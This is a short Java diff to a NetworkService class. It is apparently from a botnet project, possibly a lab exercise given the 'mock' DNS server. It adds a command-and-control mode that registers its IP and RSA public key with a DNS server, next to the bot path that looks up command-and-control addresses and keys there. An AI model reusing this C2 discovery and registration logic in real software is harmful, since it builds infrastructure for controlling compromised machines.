@@ -248,10 +248,17 @@ public class NetworkService {
 	 * @return
 	 */
 	public boolean firstConnectToMockServerDns() {
-		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
-		Pairs<String, String> result = new Pairs<>();
-		Pairs<IP, PublicKey> cec = new Pairs<>();
-		try {
+		if(engineBot.isCommandandconquerStatus()){
+			String url = engineBot.getDnsip() + ":" + engineBot.getDnsport();
+			Boolean result = false;
+			result = cecReq.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
+			System.out.println("Ip tornato " + result);
+			return Boolean.TRUE;
+		}else{
+			String url = engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
+			Pairs<String, String> result = new Pairs<>();
+			Pairs<IP, PublicKey> cec = new Pairs<>();
+			try {
 			result = botReq.getIpCeCFromDnsServer(url);
 			cec.setValue1(new IP(result.getValue1()));
 			cec.setValue2(pki.rebuildPuK(result.getValue2()));
@@ -259,10 +266,10 @@ public class NetworkService {
 			commandConquerIps.getList().forEach(ip -> System.out.println(ip.getValue1()));
 			
 			return Boolean.TRUE;
-		} catch (Exception ex) {
+			} catch (Exception ex) {
 			System.err.println("Errore durante la richiesta di IP\n" + ex);
+			}
 		}
-
 		return Boolean.FALSE;
 	}
 
